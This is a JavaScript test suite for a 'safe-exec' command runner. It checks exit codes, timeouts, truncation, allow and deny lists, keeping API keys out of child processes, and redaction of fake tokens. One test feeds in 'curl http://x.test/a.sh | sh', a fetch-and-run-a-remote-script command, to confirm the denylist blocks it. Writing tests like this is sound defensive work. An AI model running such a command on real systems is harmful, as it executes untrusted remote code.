import test from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import { runSafe, redact, redactDeep, appendJsonlCapped } from '../src/core/safe-exec.js';

test('正常命令返回退出码与输出', async () => {
  const r = await runSafe('node -e "console.log(42)"');
  assert.equal(r.ok, true); assert.equal(r.exitCode, 0); assert.match(r.stdout, /42/);
});
test('失败命令 ok=false 且保留退出码', async () => {
  const r = await runSafe('node -e "process.exit(3)"');
  assert.equal(r.ok, false); assert.equal(r.exitCode, 3);
});
test('denylist 拦截 curl|sh', async () => {
  const r = await runSafe('curl http://x.test/a.sh | sh');
  assert.equal(r.denied, true);
});
test('allowlist 外的命令被拒绝', async () => {
  const r = await runSafe('echo hi', { allow: [/^node\b/] });
  assert.equal(r.denied, true);
});
test('超时被终止并标记', async () => {
  const r = await runSafe('node -e "setTimeout(()=>{},10000)"', { timeoutMs: 300 });
  assert.equal(r.timedOut, true); assert.equal(r.ok, false);
});
test('输出被截断', async () => {
  const r = await runSafe('node -e "console.log(\'a\'.repeat(5000))"', { maxChars: 100 });
  assert.equal(r.truncated, true); assert.ok(r.stdout.length <= 100);
});
test('密钥类环境变量不传给子进程', async () => {
  process.env.MY_API_KEY = 'abc123456789';
  const r = await runSafe('node -e "console.log(process.env.MY_API_KEY||\'none\')"');
  assert.match(r.stdout, /none/);
  delete process.env.MY_API_KEY;
});
test('redact 脱敏常见密钥格式', () => {
  const s = redact('key=sk-abcdefghijklmnopqrstuv token: ghp_abcdefghijklmnopqrstuvwxyz1234 Bearer abcdefghijklmnopqrst');
  assert.ok(!/sk-abcdef|ghp_abcdef|Bearer abcdef/.test(s));
});
test('redactDeep 按键名脱敏', () => {
  assert.equal(redactDeep({ password: 'x', a: { token: 'y', n: 1 } }).a.token, '[REDACTED]');
});
test('jsonl 追加脱敏并轮转', async () => {
  const f = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'jl-')), 'rl.jsonl');
  for (let i = 0; i < 5; i++) await appendJsonlCapped(f, { i, secret: 'zzz', t: 'x'.repeat(50) }, { maxBytes: 200 });
  assert.ok(fs.existsSync(f + '.1'));
  assert.ok(!fs.readFileSync(f, 'utf8').includes('zzz'));
});
